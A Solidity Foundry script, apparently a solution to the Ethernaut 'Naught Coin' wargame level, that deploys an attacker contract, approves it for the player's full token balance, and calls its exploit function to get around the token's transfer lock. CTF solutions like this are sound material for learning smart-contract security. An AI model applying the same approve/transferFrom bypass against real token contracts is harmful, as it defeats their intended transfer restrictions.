// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { INaughtCoin } from "ethernaut/15-naught-coin/INaughtCoin.sol";
import { NaughtCoinAttacker } from "ethernaut/15-naught-coin/NaughtCoinAttacker.sol";

contract NaughtCoinScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address naughtCoinAddr = vm.envAddress("L15_NAUGHT_COIN_ADDRESS");
        INaughtCoin naughtCoin = INaughtCoin(naughtCoinAddr);

        // Step 1: deploy attacker
        NaughtCoinAttacker naughtCoinAttacker = new NaughtCoinAttacker();

        // Step 2: approve naughtCoinAttacker all balances
        uint256 amount = naughtCoin.balanceOf(vm.addr(deployerPrivateKey));
        naughtCoin.approve(address(naughtCoinAttacker), amount);

        // Step 3: transfer funds
        naughtCoinAttacker.exploit(naughtCoinAddr, amount);

        vm.stopBroadcast();
    }
}
